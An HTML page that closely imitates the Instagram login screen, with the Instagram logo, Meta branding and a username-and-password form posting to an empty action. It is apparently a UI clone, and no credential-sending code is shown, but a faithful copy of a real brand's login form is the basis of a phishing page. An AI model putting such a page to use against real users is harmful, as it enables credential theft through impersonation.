<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">

  <style>
    *, *::before, *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    :root {
      --bg: #000000;
      --text: #ffffff;
      --muted: #a8a8a8;
      --field-bg: #121212;
      --field-border: #363636;
      --field-border-focus: #a8a8a8;
      --field-text: #ffffff;
      --placeholder: #737373;
      --btn-blue: #0095f6;
      --btn-blue-dim: #0074cc;
      --outline-blue: #0095f6;
      --divider: #262626;
      --separator-text: #a8a8a8;
    }

    html, body {
      width: 100%;
      height: 100%;
      background: var(--bg);
      color: var(--text);
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      -webkit-font-smoothing: antialiased;
    }

    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      min-height: 100vh;
      min-height: 100dvh;
      padding: 0;
      overflow-x: hidden;
    }

    /* ─── MAIN CONTENT (grows) ─── */
    .main-content {
      flex: 1;
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 20px;
    }

    /* ─── LANG LABEL ─── */
    .lang-label {
      width: 100%;
      text-align: center;
      font-size: 12px;
      font-weight: 500;
      color: var(--muted);
      padding-top: 26px;
      letter-spacing: 0.01em;
    }

    /* ─── LOGO ─── */
    .logo-wrap {
      margin: 36px 0 42px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .logo-img {
      width: 108px;
      height: 108px;
      object-fit: contain;
      border-radius: 28px;
      display: block;
    }

    /* ─── FORM ─── */
    .form-wrap {
      width: 100%;
    }

    .field {
      width: 100%;
      margin-bottom: 10px;
      position: relative;
    }

    .field input {
      width: 100%;
      height: 52px;
      background: var(--field-bg);
      border: 1px solid var(--field-border);
      border-radius: 8px;
      color: var(--field-text);
      font-size: 14px;
      font-weight: 400;
      padding: 0 44px 0 14px;
      outline: none;
      transition: border-color 0.15s ease;
      font-family: inherit;
      letter-spacing: 0.01em;
    }

    .field input::placeholder {
      color: var(--placeholder);
      font-size: 13px;
    }

    .field input:focus {
      border-color: var(--field-border-focus);
    }

    /* show/hide password toggle */
    .field .toggle-pw {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: var(--text);
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      padding: 0;
      font-family: inherit;
      letter-spacing: 0.01em;
    }

    .btn-login {
      width: 100%;
      height: 44px;
      margin-top: 6px;
      border: none;
      border-radius: 8px;
      background: var(--btn-blue);
      color: #ffffff;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      font-family: inherit;
      transition: background 0.15s ease, opacity 0.15s ease;
      letter-spacing: 0.01em;
    }

    .btn-login:hover { background: var(--btn-blue-dim); }
    .btn-login:active { opacity: 0.85; }

    /* ─── FORGOT PASSWORD ─── */
    .forgot {
      display: block;
      text-align: center;
      color: var(--text);
      font-size: 13px;
      font-weight: 500;
      margin-top: 20px;
      text-decoration: none;
      letter-spacing: 0.01em;
    }

    /* ─── OR DIVIDER ─── */
    .or-row {
      display: flex;
      align-items: center;
      gap: 14px;
      width: 100%;
      margin: 28px 0 22px;
    }

    .or-line {
      flex: 1;
      height: 1px;
      background: var(--divider);
    }

    .or-text {
      font-size: 13px;
      font-weight: 600;
      color: var(--separator-text);
      letter-spacing: 0.04em;
      white-space: nowrap;
    }

    /* ─── FACEBOOK LOGIN ─── */
    .btn-fb {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 9px;
      width: 100%;
      height: 44px;
      background: none;
      border: none;
      color: #4a8ff7;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      font-family: inherit;
      letter-spacing: 0.01em;
    }

    .fb-icon {
      width: 18px;
      height: 18px;
      flex-shrink: 0;
    }

    /* ─── BOTTOM ZONE (pinned) ─── */
    .bottom-zone {
      flex: 0 0 auto;
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 20px 28px;
    }

    .bottom-divider {
      width: 100%;
      height: 1px;
      background: var(--divider);
      margin-bottom: 22px;
    }

    .btn-create {
      width: 100%;
      height: 44px;
      border-radius: 8px;
      border: 1.5px solid var(--outline-blue);
      background: transparent;
      color: var(--outline-blue);
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      font-family: inherit;
      letter-spacing: 0.01em;
      transition: background 0.15s ease;
      margin-bottom: 22px;
    }

    .btn-create:hover {
      background: rgba(0, 149, 246, 0.08);
    }

    /* Meta branding */
    .meta-brand {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      color: var(--muted);
      font-size: 13px;
      font-weight: 400;
    }

    .meta-logo {
      width: 46px;
      height: auto;
      opacity: 0.75;
    }

    /* ─── ANIMATIONS ─── */
    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(14px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    .lang-label  { animation: fadeUp 0.4s ease both; animation-delay: 0.05s; }
    .logo-wrap   { animation: fadeUp 0.4s ease both; animation-delay: 0.12s; }
    .form-wrap   { animation: fadeUp 0.4s ease both; animation-delay: 0.20s; }
    .forgot      { animation: fadeUp 0.4s ease both; animation-delay: 0.26s; }
    .or-row      { animation: fadeUp 0.4s ease both; animation-delay: 0.30s; }
    .btn-fb      { animation: fadeUp 0.4s ease both; animation-delay: 0.34s; }
    .bottom-zone { animation: fadeUp 0.4s ease both; animation-delay: 0.40s; }
  </style>
</head>
<body>

  <!-- ── MAIN (grows) ── -->
  <div class="main-content">

    <div class="lang-label">English (US)</div>

    <div class="logo-wrap">
      <!-- Replace src with your logo -->
      <img
        class="logo-img"
        src="https://tse2.mm.bing.net/th/id/OIP.FeWotnRGnssUzaP_Q6mLKwHaHa?pid=Api&P=0&h=180"
        alt="Instagram"
      />
    </div>

    <form class="form-wrap" method="post" action="" autocomplete="off">

      <div class="field">
        <input
          id="username"
          type="text"
          name="username"
          placeholder="Phone number, username or email"
          autocomplete="username"
          required
        />
      </div>

      <div class="field">
        <input
          id="password"
          type="password"
          name="password"
          placeholder="Password"
          autocomplete="current-password"
          required
        />
        <button type="button" class="toggle-pw" onclick="
          var f = document.getElementById('password');
          f.type = f.type === 'password' ? 'text' : 'password';
          this.textContent = f.type === 'password' ? 'Show' : 'Hide';
        ">Show</button>
      </div>

      <button class="btn-login" type="submit">Log in</button>

    </form>

    <a class="forgot" href="#">Forgot password?</a>

    <div class="or-row">
      <div class="or-line"></div>
      <span class="or-text">OR</span>
      <div class="or-line"></div>
    </div>

    <button class="btn-fb" type="button">
      <!-- Facebook f icon -->
      <svg class="fb-icon" viewBox="0 0 24 24" fill="#4a8ff7" xmlns="http://www.w3.org/2000/svg">
        <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.235 2.686.235v2.97h-1.513c-1.491 0-1.956.93-1.956 1.887v2.268h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
      </svg>
      Log in with Facebook
    </button>

  </div>

  <!-- ── BOTTOM (pinned) ── -->
  <div class="bottom-zone">
    <div class="bottom-divider"></div>

    <button class="btn-create" type="button">Create new account</button>

    <div class="meta-brand">
      <!-- Meta wordmark SVG -->
      <svg class="meta-logo" viewBox="0 0 80 20" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Meta">
        <path d="M3 16C3 10 5.5 4 8.5 4C11 4 13 10 16 16C17.5 13 18.5 9 18.5 6.5C18.5 3 16.5 1 14 1C10.5 1 8 5 6 9" stroke="#a8a8a8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        <path d="M6 9C4.5 12 3 14.5 3 16C3 17.7 4 19 5.5 19C8 19 10 13 13 8C15 5 17 3 19.5 3C22.5 3 24 5.5 24 9C24 12.5 22.5 16 20.5 16" stroke="#a8a8a8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        <text x="30" y="15" fill="#a8a8a8" font-size="13" font-family="Inter, sans-serif" font-weight="600" letter-spacing="0.02em">Meta</text>
      </svg>
    </div>
  </div>

</body>
</html>
